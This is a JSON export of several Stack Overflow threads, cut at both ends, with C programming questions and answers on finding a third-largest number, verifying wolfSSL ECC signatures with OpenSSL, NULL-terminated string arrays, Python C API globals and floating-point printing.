tag?"}, {"owner": {"reputation": 6114, "user_id": 3070060, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a936bdd7a67a345d312281305d5adde?s=128&d=identicon&r=PG&f=1", "display_name": "PaulF", "link": "https://stackoverflow.com/users/3070060/paulf"}, "edited": false, "score": 1, "creation_date": 1476266919, "post_id": 39995114, "comment_id": 67269647, "body": "What should be printed in the event that 3 numbers are specified &amp; 3 identical numbers are entered - should you print that value as third largest, print zero or do you want to print &quot;There is no third largest number&quot;?"}], "answers": [{"comments": [{"owner": {"reputation": 634, "user_id": 1271079, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/a15e02b49f38872d35ae7d1b0aac9d9d?s=128&d=identicon&r=PG", "display_name": "taktak004", "link": "https://stackoverflow.com/users/1271079/taktak004"}, "reply_to_user": {"reputation": 32386, "user_id": 4706785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fdee2789e9bac57bfdd97abc4e533a4d?s=128&d=identicon&r=PG&f=1", "display_name": "Peter", "link": "https://stackoverflow.com/users/4706785/peter"}, "edited": false, "score": 0, "creation_date": 1476277741, "post_id": 39995336, "comment_id": 67276551, "body": "Indeed but considering the original code, I thought that won&#39;t be important. You just need to initialize the 1st, 2nd and 3rd largest to the smallest possible int"}, {"owner": {"reputation": 32921, "user_id": 5771269, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be6a5b618f5bd197150a6186318beba7?s=128&d=identicon&r=PG&f=1", "display_name": "cdlane", "link": "https://stackoverflow.com/users/5771269/cdlane"}, "edited": false, "score": 1, "creation_date": 1476292384, "post_id": 39995336, "comment_id": 67286869, "body": "This code doesn&#39;t work if there is one or more duplicated numbers, e.g. the 3 numbers 1 3 3 returns 0 as the third largest."}, {"owner": {"reputation": 634, "user_id": 1271079, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/a15e02b49f38872d35ae7d1b0aac9d9d?s=128&d=identicon&r=PG", "display_name": "taktak004", "link": "https://stackoverflow.com/users/1271079/taktak004"}, "edited": false, "score": 0, "creation_date": 1476345982, "post_id": 39995336, "comment_id": 67308153, "body": "Indeed.  I fixed it.  But as that was not the original question  not sure if we should cover all the cases instead of letting him find from himself."}], "tags": [], "owner": {"reputation": 634, "user_id": 1271079, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/a15e02b49f38872d35ae7d1b0aac9d9d?s=128&d=identicon&r=PG", "display_name": "taktak004", "link": "https://stackoverflow.com/users/1271079/taktak004"}, "is_accepted": false, "score": 2, "last_activity_date": 1476345819, "last_edit_date": 1476345819, "creation_date": 1476265106, "answer_id": 39995336, "question_id": 39995114, "link": "https://stackoverflow.com/questions/39995114/how-to-find-the-third-largest-integer-in-c-without-using-arrays/39995336#39995336", "title": "How to find the third largest integer in C without using arrays?", "body": "<p>When you found the first or second largest, then you need to \"shift\" the smaller ones (and you can replace your second and 3rd if by 'else if'). \nIf you want to handle negatives input set the 3 largest to the smallest int.  And use >= instead of > to handle duplicates. </p>\n\n<pre><code>    int num;\n    int largest = INT_MIN;\n    int secondlargest = INT_MIN;\n    int thirdlargest = INT_MIN;\n    printf(\"Please enter the number of integers:\");\n    scanf_s(\"%d\", &amp;num);\n\n    if (num &gt; 2)\n    {\n        scanf_s(\"%d\", &amp;largest);\n\n        while (--num &gt; 0)\n        {\n            int tmp;\n            scanf_s(\"%d\", &amp;tmp);\n            if (tmp &gt;= largest){\n                thirdlargest = secondlargest;\n                secondlargest = largest;\n                largest = tmp;\n            } \n            else if (tmp &gt;= secondlargest){\n                thirdlargest = secondlargest;\n                secondlargest = tmp;\n            } \n            else if (tmp &gt; thirdlargest)\n                thirdlargest = tmp;\n        }\n        printf(\"The third largest number is %d\\n\", thirdlargest);\n\n    }\n    else\n    {\n        printf(\"There is no third largest number.\");\n    }\n    return 0;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 32921, "user_id": 5771269, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be6a5b618f5bd197150a6186318beba7?s=128&d=identicon&r=PG&f=1", "display_name": "cdlane", "link": "https://stackoverflow.com/users/5771269/cdlane"}, "is_accepted": false, "score": 1, "last_activity_date": 1476292680, "last_edit_date": 1476292680, "creation_date": 1476291768, "answer_id": 40004355, "question_id": 39995114, "link": "https://stackoverflow.com/questions/39995114/how-to-find-the-third-largest-integer-in-c-without-using-arrays/40004355#40004355", "title": "How to find the third largest integer in C without using arrays?", "body": "<p>If you want to handle negatives too, set your three largest values to the minimum integer.  Also use <code>else if</code> instead of <code>if</code> so you can use simple comparisons, instead of compound ones, followed by shifting your variables:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;limits.h&gt;\n\nint main(void)\n{\n    int number;\n\n    printf(\"Please enter the number of integers: \");\n    (void) scanf(\"%d\", &amp;number);\n\n    if (number &lt; 3)\n    {\n        printf(\"There is no third largest number.\");\n\n        return 1;\n    }\n\n    int largest = INT_MIN;\n    int secondlargest = INT_MIN;\n    int thirdlargest = INT_MIN;\n\n    while (number-- &gt; 0)\n    {\n        int temporary;\n        (void) scanf(\"%d\", &amp;temporary);\n\n        if (temporary &gt; largest)\n        {\n            thirdlargest = secondlargest;\n            secondlargest = largest;\n            largest = temporary;\n        }\n        else if (temporary &gt; secondlargest)\n        {\n            thirdlargest = secondlargest;\n            secondlargest = temporary;\n        }\n        else if (temporary &gt; thirdlargest) {\n            thirdlargest = temporary;\n        }\n    }\n\n    printf(\"The third largest number is %d\\n\", thirdlargest);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 0, "last_activity_date": 1476914111, "creation_date": 1476914111, "answer_id": 40142145, "question_id": 39995114, "link": "https://stackoverflow.com/questions/39995114/how-to-find-the-third-largest-integer-in-c-without-using-arrays/40142145#40142145", "title": "How to find the third largest integer in C without using arrays?", "body": "<p>Some pseudo code that simplifies and corrects your <code>if()</code> structure.</p>\n\n<pre><code>int largest1 = INT_MIN;\nint largest2 = INT_MIN;\nint largest3 = INT_MIN;\n\nint input = ...;\n\nif (input &gt; largest3) {\n  largest3 = input;\n  if (largest3 &gt; largest2) {\n    swap(largest2, largest3);\n    if (largest2 &gt; largest1) {\n      swap(largest1, largest2);\n    }\n  }\n}\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 3027196, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/02317a7583696bb9ad5b72e31746c285?s=128&d=identicon&r=PG&f=1", "display_name": "DaneXJJ", "link": "https://stackoverflow.com/users/3027196/danexjj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 967, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1476914111, "creation_date": 1476264467, "last_edit_date": 1476272045, "question_id": 39995114, "link": "https://stackoverflow.com/questions/39995114/how-to-find-the-third-largest-integer-in-c-without-using-arrays", "title": "How to find the third largest integer in C without using arrays?", "body": "<p>I need help, my program isn't working out, it keeps showing me 0 as the value! What is wrong with my code?</p>\n\n<p>the program requires the user to enter the number of integers at the start. </p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main(void)\n{   \n    int num;\n    int largest= 0;\n    int secondlargest= 0;\n    int thirdlargest=0;\n    printf(\"Please enter the number of integers:\");\n    scanf(\"%d\", &amp;num);\n\n    if(num &gt; 2)\n    {\n        scanf(\"%d\",&amp;largest);\n\n        while(--num &gt; 0)\n        {   \n            int tmp;\n            scanf(\"%d\",&amp;tmp);\n            if(tmp&gt;largest)\n            largest=tmp;\n\n            if(tmp &gt; secondlargest &amp;&amp; tmp &lt; largest)\n            secondlargest=tmp;\n\n            if(tmp &gt; thirdlargest &amp;&amp; tmp &lt; secondlargest &amp;&amp; tmp &lt; largest)\n            thirdlargest=tmp;\n        }\n            printf(\"The third largest number is %d\\n\",thirdlargest);\n\n    }\n    else\n    {\n        printf(\"There is no third largest number.\");\n    }\n    return 0;\n    }\n</code></pre>\n\n<p>here is my code, as written above! I need to submit it without using array! Any help would be deeply appreciated! </p>\n"}, {"tags": ["c", "cryptography", "elliptic-curve", "challenge-response", "wolfssl"], "comments": [{"owner": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "edited": false, "score": 0, "creation_date": 1476286596, "post_id": 39994824, "comment_id": 67283146, "body": "<i>&quot;I save the output in DER format and try to verify with openSSL, the verification fails...&quot;</i> - Please show your code. Also see <a href=\"http://wiki.openssl.org/index.php/EVP_Signing_and_Verifying\" rel=\"nofollow noreferrer\">EVP Signing and Verifying</a> on the OpenSSL wiki."}, {"owner": {"reputation": 21, "user_id": 6507468, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh6.googleusercontent.com/-_4j78H5avfY/AAAAAAAAAAI/AAAAAAAAAyU/5S29-KazpRQ/photo.jpg?sz=128", "display_name": "Mayank Vijh", "link": "https://stackoverflow.com/users/6507468/mayank-vijh"}, "reply_to_user": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "edited": false, "score": 0, "creation_date": 1476672163, "post_id": 39994824, "comment_id": 67428505, "body": "Hey jww, Please check if possible. Thanks"}], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 6507468, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh6.googleusercontent.com/-_4j78H5avfY/AAAAAAAAAAI/AAAAAAAAAyU/5S29-KazpRQ/photo.jpg?sz=128", "display_name": "Mayank Vijh", "link": "https://stackoverflow.com/users/6507468/mayank-vijh"}, "edited": false, "score": 0, "creation_date": 1484893843, "post_id": 41730518, "comment_id": 70706627, "body": "Hi Kaleb, thanks for the reply. I forgot to close this, I found out that wolfSSL actually takes in the octet string for public key in ECC module, and it worked when I passed that."}], "tags": [], "owner": {"reputation": 526, "user_id": 4629630, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7DX63.png?s=128&g=1", "display_name": "Kaleb", "link": "https://stackoverflow.com/users/4629630/kaleb"}, "is_accepted": false, "score": 1, "last_activity_date": 1484778140, "creation_date": 1484778140, "answer_id": 41730518, "question_id": 39994824, "link": "https://stackoverflow.com/questions/39994824/how-to-verify-ecc-signature-from-wolfssl-with-openssl/41730518#41730518", "title": "How to verify ECC Signature from wolfSSL with OpenSSL", "body": "<p>In the past when working with openSSL and comparing sign values to wolfSSL I have found that OpenSSL does the following steps when signing:</p>\n\n<ol>\n<li>Read in and decode the key</li>\n<li>compute a hash</li>\n<li>Signature Encode the hash</li>\n<li>sign the encoded hash</li>\n<li>Base64 Encode the signature</li>\n</ol>\n\n<p>OpenSSL does not make this apparent or user-friendly so unfortunately it's something you have to discover as you have.</p>\n\n<p>Please use the following steps in wolfSSL to achieve your desired output:</p>\n\n<p>1 Create or import your ECC key <br>\n2 Compute the sha hash on the input as you did previously<br>\n3 Encode the hash with this API call: <code>encodedSz = wc_EncodeSignature(encodedOutput, hashInput, SHA256_DIGEST_SIZE, SHA256h);</code><br>\n4 Sign the encoded hash<br>\n5 Now do the verify</p>\n\n<p>Let us know if that works for you.</p>\n"}], "owner": {"reputation": 21, "user_id": 6507468, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh6.googleusercontent.com/-_4j78H5avfY/AAAAAAAAAAI/AAAAAAAAAyU/5S29-KazpRQ/photo.jpg?sz=128", "display_name": "Mayank Vijh", "link": "https://stackoverflow.com/users/6507468/mayank-vijh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 998, "favorite_count": 1, "answer_count": 1, "score": 2, "last_activity_date": 1485431401, "creation_date": 1476263608, "last_edit_date": 1485431401, "question_id": 39994824, "link": "https://stackoverflow.com/questions/39994824/how-to-verify-ecc-signature-from-wolfssl-with-openssl", "title": "How to verify ECC Signature from wolfSSL with OpenSSL", "body": "<p>I am new to Elliptic Curve Cryptography, openSSL and wolfSSL. My context is that I generate KeyPair from command line with openssl and import the private key to my code. Then I use wolfSSL to generate signature and output it.</p>\n\n<p>I save the output in DER format and try to verify with openSSL, the verification fails.</p>\n\n<p>If I Sign and Verify inside my code with wolfSSL, it verifies successfully and also it's successful if I sign and verify in command line with openSSL.</p>\n\n<p>Is there an encoding issue, which I am not sure about?</p>\n\n<p>Update Code</p>\n\n<pre><code>// ECC public key\nconst uint8_t pubKey[] ={Hex Format key};\n// ECC Signature from wolfSSL\nchar* sigString = {Signature from wolfSSL returned as char};\n/* TYPE CONVERTIONS*/\nconst uint8_t *der_bytes_copy;\nconst uint8_t *pub_bytes_copy;\nder_bytes_copy = (const unsigned char*)sigString;\npub_bytes_copy = pubKey;\n\n\nEC_KEY *ECpubkey;\nsize_t keySize = sizeof(pubKey);\nint eccgrp;\neccgrp = OBJ_txt2nid(\"secp256r1\");\n ECpubkey = EC_KEY_new_by_curve_name(eccgrp);\no2i_ECPublicKey(&amp;ECpubkey, &amp;pub_bytes_copy, keySize);\nECDSA_SIG *signature;\nsignature = d2i_ECDSA_SIG(NULL, &amp;der_bytes_copy, signedSize);\nuint8_t digest[36];\nint verified;\nconst char message[] = \"Test for Authenticate Kernel with ECC\";\nSHA256_CTX ctx;\nSHA256_Init(&amp;ctx);\nSHA256_Update(&amp;ctx, (const uint8_t*)message,sizeof(message));\nSHA256_Final(digest, &amp;ctx);\nverified = ECDSA_do_verify(digest, sizeof(digest), signature, ECpubkey);\n</code></pre>\n\n<p>The private key is used with wolfSSL to sign the message and then the public key with openssl to verify, but this stops abruptly.</p>\n"}, {"tags": ["c", "c-strings"], "comments": [{"owner": {"reputation": 17, "user_id": 6120336, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e7434eae4dfc16a11f3346285f6d8e95?s=128&d=identicon&r=PG&f=1", "display_name": "haochenghhc", "link": "https://stackoverflow.com/users/6120336/haochenghhc"}, "edited": false, "score": 0, "creation_date": 1476262038, "post_id": 39994264, "comment_id": 67266433, "body": "while i can&#39;t get the NULL flags,i mean i wil can&#39;t stop."}, {"owner": {"reputation": 5114, "user_id": 671150, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/63d5dd392b5e95b4ede4fc702e8c7bcd?s=128&d=identicon&r=PG", "display_name": "Nurjan", "link": "https://stackoverflow.com/users/671150/nurjan"}, "edited": false, "score": 2, "creation_date": 1476262039, "post_id": 39994264, "comment_id": 67266434, "body": "You should state what language you&#39;re using and make the code more readable."}, {"owner": {"reputation": 17, "user_id": 6120336, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e7434eae4dfc16a11f3346285f6d8e95?s=128&d=identicon&r=PG&f=1", "display_name": "haochenghhc", "link": "https://stackoverflow.com/users/6120336/haochenghhc"}, "reply_to_user": {"reputation": 5114, "user_id": 671150, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/63d5dd392b5e95b4ede4fc702e8c7bcd?s=128&d=identicon&r=PG", "display_name": "Nurjan", "link": "https://stackoverflow.com/users/671150/nurjan"}, "edited": false, "score": 0, "creation_date": 1476264639, "post_id": 39994264, "comment_id": 67268117, "body": "ok,i know ,i should modify <b>while(array != NULL)</b> for <b>while(*array != NULL)</b>"}], "answers": [{"comments": [{"owner": {"reputation": 17, "user_id": 6120336, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e7434eae4dfc16a11f3346285f6d8e95?s=128&d=identicon&r=PG&f=1", "display_name": "haochenghhc", "link": "https://stackoverflow.com/users/6120336/haochenghhc"}, "edited": false, "score": 0, "creation_date": 1476263597, "post_id": 39994378, "comment_id": 67267390, "body": "after modify\uff0ci want to get the two-dimensionalh which i have defined. **"}, {"owner": {"reputation": 17, "user_id": 6120336, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e7434eae4dfc16a11f3346285f6d8e95?s=128&d=identicon&r=PG&f=1", "display_name": "haochenghhc", "link": "https://stackoverflow.com/users/6120336/haochenghhc"}, "edited": false, "score": 0, "creation_date": 1476263718, "post_id": 39994378, "comment_id": 67267482, "body": "** void chack_array(char <i>*array) { \twhile(array != NULL){ \t\tprintf(&quot;%s\\n&quot;,(</i> array)); \t\tarray ++; \t} } ** and in main() **      char *dirp_array[256]; \tlist_dir(dirp_array); \tchack_array(dirp_array); ** but it have core dump."}, {"owner": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "reply_to_user": {"reputation": 17, "user_id": 6120336, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e7434eae4dfc16a11f3346285f6d8e95?s=128&d=identicon&r=PG&f=1", "display_name": "haochenghhc", "link": "https://stackoverflow.com/users/6120336/haochenghhc"}, "edited": false, "score": 0, "creation_date": 1476266971, "post_id": 39994378, "comment_id": 67269682, "body": "@haochenghhc note that your <code>dirp_array</code> is not two-dimensional array. it is array of pointers (which point to pointers to char). You could also have two-dimensional array of char, which would be quite different thing, even if you can index it with same <code>foo[row][column]</code> syntax. C arrays and pointers, and especially mixing them, are rather a complicated subject, and passing arrays to functions is even more complicated."}], "tags": [], "owner": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "is_accepted": true, "score": 1, "last_activity_date": 1476262336, "creation_date": 1476262336, "answer_id": 39994378, "question_id": 39994264, "link": "https://stackoverflow.com/questions/39994264/two-dimensional-string-pointer/39994378#39994378", "title": "Two-dimensional string pointer", "body": "<p>This line:</p>\n\n<pre><code>dirp_array = NULL;\n</code></pre>\n\n<p>Should be</p>\n\n<pre><code>*dirp_array = NULL;\n</code></pre>\n\n<p>Your first version does not change contents of the array provided by caller. It just says that the <code>dirp_array</code> pointer is now <code>NULL</code>, ie does not point to any array. You want to store <code>NULL</code> to an element in the caller's array, and you do that by the 2nd version above, dereferencing the pointer.</p>\n"}], "owner": {"reputation": 17, "user_id": 6120336, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e7434eae4dfc16a11f3346285f6d8e95?s=128&d=identicon&r=PG&f=1", "display_name": "haochenghhc", "link": "https://stackoverflow.com/users/6120336/haochenghhc"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 224, "favorite_count": 0, "accepted_answer_id": 39994378, "answer_count": 1, "score": -3, "last_activity_date": 1476264383, "creation_date": 1476261939, "last_edit_date": 1476264383, "question_id": 39994264, "link": "https://stackoverflow.com/questions/39994264/two-dimensional-string-pointer", "title": "Two-dimensional string pointer", "body": "<p>In the process of debugging this procedure, I found two-dimensional behind the target can not add NULL.</p>\n\n<pre><code>void list_dir(char **dirp_array)\n{\n    char *dir_name = \"./\";\n    DIR *dp;\n    struct dirent *dirp;\n\n    if ((dp = opendir((const char *)dir_name)) == NULL){\n        perr_exit(\"opendir errno\");\n    }\n\n    while((dirp = readdir(dp)) != NULL){\n        (* dirp_array) = strdup((char *)dirp-&gt;d_name);\n        printf(\"%s\\n\",(* dirp_array));\n        dirp_array ++;\n        //dirp_array += strlen(*dirp_array);\n    }\n    *dirp_array = NULL;\n    closedir(dp);\n}\n</code></pre>\n\n<p>after modify\uff0ci want to get the two-dimensionalh which i have defined.\nso, i define a function here.</p>\n\n<pre><code>void chack_array(char **array)\n{\n    while(array != NULL){\n        printf(\"%s\\n\",(* array));\n        array ++;\n    }\n}\n\nmain(){\n    char *dirp_array[256];\n    list_dir(dirp_array);\n    chack_array(dirp_array);\n}\n</code></pre>\n\n<p>but i core dump</p>\n"}, {"tags": ["python", "c", "python-3.x", "python-c-api"], "comments": [{"owner": {"reputation": 23048, "user_id": 4657412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4915a27d01efa79d81d322511ee517a9?s=128&d=identicon&r=PG&f=1", "display_name": "DavidW", "link": "https://stackoverflow.com/users/4657412/davidw"}, "edited": false, "score": 0, "creation_date": 1476263337, "post_id": 39994010, "comment_id": 67267220, "body": "I think you need to pass it the interpreter globals instead of an empty dictionary. But I can&#39;t see how to do it."}, {"owner": {"reputation": 23048, "user_id": 4657412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4915a27d01efa79d81d322511ee517a9?s=128&d=identicon&r=PG&f=1", "display_name": "DavidW", "link": "https://stackoverflow.com/users/4657412/davidw"}, "edited": false, "score": 0, "creation_date": 1476263396, "post_id": 39994010, "comment_id": 67267253, "body": "Actually, probably see <a href=\"http://stackoverflow.com/a/25907027/4657412\">stackoverflow.com/a/25907027/4657412</a>"}, {"owner": {"reputation": 9885, "user_id": 1039947, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/eYRpr.png?s=128&g=1", "display_name": "kmp", "link": "https://stackoverflow.com/users/1039947/kmp"}, "reply_to_user": {"reputation": 23048, "user_id": 4657412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4915a27d01efa79d81d322511ee517a9?s=128&d=identicon&r=PG&f=1", "display_name": "DavidW", "link": "https://stackoverflow.com/users/4657412/davidw"}, "edited": false, "score": 0, "creation_date": 1476263637, "post_id": 39994010, "comment_id": 67267413, "body": "Thanks, sadly PyEval_GetGlobals();  returns null (I get SystemError: PyEval_EvalCodeEx: NULL globals from the call).  Do I need to import the <b>main</b> module or something like that perhaps?"}, {"owner": {"reputation": 9885, "user_id": 1039947, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/eYRpr.png?s=128&g=1", "display_name": "kmp", "link": "https://stackoverflow.com/users/1039947/kmp"}, "reply_to_user": {"reputation": 23048, "user_id": 4657412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4915a27d01efa79d81d322511ee517a9?s=128&d=identicon&r=PG&f=1", "display_name": "DavidW", "link": "https://stackoverflow.com/users/4657412/davidw"}, "edited": false, "score": 0, "creation_date": 1476264037, "post_id": 39994010, "comment_id": 67267714, "body": "Ahh, thanks to your tip off I started looking for GetGlobals returns null and found this: <a href=\"http://www.gossamer-threads.com/lists/python/python/8946#8946\" rel=\"nofollow noreferrer\">gossamer-threads.com/lists/python/python/8946#8946</a> - seems I need to do pGlobal = PyModule_GetDict(PyImport_AddModule(&quot;<b>main</b>&quot;)); (instead of pGlobal = PyDict_New()) and then it works. (there&#39;s underscores in that main, not bold)  THANK YOU!"}, {"owner": {"reputation": 23048, "user_id": 4657412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4915a27d01efa79d81d322511ee517a9?s=128&d=identicon&r=PG&f=1", "display_name": "DavidW", "link": "https://stackoverflow.com/users/4657412/davidw"}, "edited": false, "score": 0, "creation_date": 1476265999, "post_id": 39994010, "comment_id": 67269025, "body": "Glad to have pointed you on the right track. (I&#39;m not sure I&#39;d have got to the useful answer myself). By the way, you can put code in comments with backticks (`)"}], "answers": [{"tags": [], "owner": {"reputation": 9885, "user_id": 1039947, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/eYRpr.png?s=128&g=1", "display_name": "kmp", "link": "https://stackoverflow.com/users/1039947/kmp"}, "is_accepted": false, "score": 1, "last_activity_date": 1476265557, "last_edit_date": 1495541970, "creation_date": 1476265557, "answer_id": 39995510, "question_id": 39994010, "link": "https://stackoverflow.com/questions/39994010/how-to-include-build-class-when-creating-a-module-in-the-python-c-api/39995510#39995510", "title": "How to include __build_class__ when creating a module in the python C API", "body": "<p>Their are (at least) two ways to solve this it seems...</p>\n\n<h2>Way 1</h2>\n\n<p>Instead of:</p>\n\n<pre><code>pGlobal = PyDict_New();\n</code></pre>\n\n<p>You can import the <code>__main__</code> module and get it's globals dictionary like this:</p>\n\n<pre><code>pGlobal = PyModule_GetDict(PyImport_AddModule(\"__main__\"));\n</code></pre>\n\n<p>This way is described like so:</p>\n\n<blockquote>\n  <p>BUT PyEval_GetGlobals will return null it it is not called from within \n  Python. This will never be the case when extending Python, but when Python \n  is embedded, it may happen. This is because PyRun_* define the global \n  scope, so if you're not somehow inside a PyRun_ thing (e.g. module called \n  from python called from embedder), there are no globals. </p>\n  \n  <p>In an embedded-python situation, if you decide that all of your PyRun_* \n  calls are going to use <code>__main__</code> as the global namespace, \n  PyModule_GetDict(PyImport_AddModule(\"<code>__main__</code>\")) will do it.</p>\n</blockquote>\n\n<p>Which I got from the question <a href=\"http://www.gossamer-threads.com/lists/python/python/8946#8946\" rel=\"nofollow noreferrer\">embedding</a> I found over on this <a href=\"http://www.gossamer-threads.com/lists/python/python/\" rel=\"nofollow noreferrer\">Python list</a>.</p>\n\n<h2>Way 2</h2>\n\n<p>Or as an alternative, which I personally prefer to importing the main module (and found <a href=\"https://stackoverflow.com/a/10684099/1039947\">here</a>), you can do this to populate the new dictionary you created with the built-in stuff which includes <code>__build_class__</code>:</p>\n\n<pre><code>pGlobal = PyDict_New();\nPyDict_SetItemString(pGlobal, \"__builtins__\", PyEval_GetBuiltins());\n</code></pre>\n"}], "owner": {"reputation": 9885, "user_id": 1039947, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/eYRpr.png?s=128&g=1", "display_name": "kmp", "link": "https://stackoverflow.com/users/1039947/kmp"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 491, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1476265557, "creation_date": 1476261166, "question_id": 39994010, "link": "https://stackoverflow.com/questions/39994010/how-to-include-build-class-when-creating-a-module-in-the-python-c-api", "title": "How to include __build_class__ when creating a module in the python C API", "body": "<p>I am trying to use the <a href=\"https://docs.python.org/3/c-api/\" rel=\"nofollow\">Python 3.5 C API</a> to execute some code that includes constructing a class.  Specifically this:</p>\n\n<pre><code>class MyClass:\n    def test(self):\n        print('test')\n\nMyClass().test()\n</code></pre>\n\n<p>The problem I have is that it errors like this:</p>\n\n<pre><code>Traceback (most recent call last):\n  File \"&lt;string&gt;\", line 1, in &lt;module&gt;\nNameError: __build_class__ not found\n</code></pre>\n\n<p>So somehow I need my module to include <code>__build_class__</code>, but I am not sure how (I guess that I would also miss other things you get by default when using <a href=\"https://www.python.org/\" rel=\"nofollow\">Python</a> too) - is there a way to include all this built-in stuff in my module?</p>\n\n<p>Here is my code so far:</p>\n\n<pre><code>#include &lt;Python.h&gt;\n\nint main(void)\n{\n    int ret = 0;\n    PyObject *pValue, *pModule, *pGlobal, *pLocal;\n\n    Py_Initialize();\n\n    pGlobal = PyDict_New();\n    pModule = PyModule_New(\"mymod\");\n    pLocal = PyModule_GetDict(pModule);\n\n    pValue = PyRun_String(\n        \"class MyClass:\\n\\tdef test(self):\\n\\t\\tprint('test')\\n\\nMyClass().test()\",\n        Py_file_input,\n        pGlobal,\n        pLocal);\n\n    if (pValue == NULL) {\n        if (PyErr_Occurred()) {\n            PyErr_Print();\n        }\n        ret = 1;\n    } else {\n        Py_DECREF(pValue);\n    }\n\n    Py_Finalize();\n\n    return ret;\n}\n</code></pre>\n\n<p>so <code>pValue</code> is <code>NULL</code> and it is calling <code>PyErr_Print</code>.</p>\n"}, {"tags": ["c", "math", "floating-point"], "comments": [{"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 1, "creation_date": 1476260969, "post_id": 39993873, "comment_id": 67265766, "body": "Indent your code before to post and write it in English so people can understand something more."}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 1, "creation_date": 1476261225, "post_id": 39993873, "comment_id": 67265926, "body": "Signature for main can be: <code>int main (void)</code> or <code>main(int argc, char *argv[])</code>"}, {"owner": {"reputation": 6816, "user_id": 865481, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0b2if.gif?s=128&g=1", "display_name": "Salix alba", "link": "https://stackoverflow.com/users/865481/salix-alba"}, "edited": false, "score": 0, "creation_date": 1476261582, "post_id": 39993873, "comment_id": 67266140, "body": "A simple thing you can do is change the formatting for printing numbers rather that <code>%f</code> try using <code>%.3f</code> or <code>%6.3f</code>. Maths in C is very accurate is more that the results don&#39;t always appear nicely in decimals."}, {"owner": {"reputation": 2048, "user_id": 4961259, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/9b82c25cbde4d52888e6eccc44764b80?s=128&d=identicon&r=PG&f=1", "display_name": "Kami Kaze", "link": "https://stackoverflow.com/users/4961259/kami-kaze"}, "edited": false, "score": 0, "creation_date": 1476262179, "post_id": 39993873, "comment_id": 67266526, "body": "You said you understand that floating point is not exact and then you say that  278.24 is not 278.23999. For 32bit float this is fine. And the order in which you calculate your result strongly impacts the result"}, {"owner": {"reputation": 48421, "user_id": 1196549, "user_type": "registered", 